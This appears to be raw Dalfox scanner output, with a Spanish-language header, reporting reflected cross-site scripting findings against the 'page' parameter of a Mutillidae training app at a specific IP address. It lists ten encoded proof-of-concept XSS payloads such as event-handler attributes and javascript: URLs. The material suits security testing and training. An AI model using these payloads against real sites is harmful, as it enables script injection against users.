🔗 URL: http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
🧩 Parámetro afectado: page
📄 Evidencia:
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Csource+onload%3Dprompt%281%29+class%3Ddalfox%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fdo%3Dtoggle-bubble-hints%26page%3Dshow-log.php=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?go=%26gt%3B%26lt%3Bform%26gt%3B%26lt%3Bbutton+formaction%3Djavascript%3Aalert%281%29%26gt%3Btest%26lt%3B%2Fbutton%26gt%3B%26lt%3B%2Fform%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dsource-viewer.php=%22%3E%3CIMG+SRC%3Dx+onratechange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&query=%3E%3Cembed+src%3Djavascript%3Aalert%281%29+class%3Ddalfox%3E%3C%2Fembed%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-A7-Insufficient_Attack_Protection=%22%3E%3CIMG+SRC%3Dx+onmessage%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?http%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2010-A8=%26%2339%3B%26gt%3B%26lt%3Bobject+data%3D%23+codebase%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%26gt%3B%26lt%3B%2Fobject%26gt%3B&page=show-log.php[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Cdiv+ontransitioncancel%3Dprompt%281%29+class%3Ddalfox%3E%3C%2Fdiv%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A7-Missing_Function_Level_Access_Control=%26gt%3B%26lt%3Bembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%26gt%3B%26lt%3B%2Fembed%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?keyword=%22%3E%3CIMG+SRC%3Dx+ondragend%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
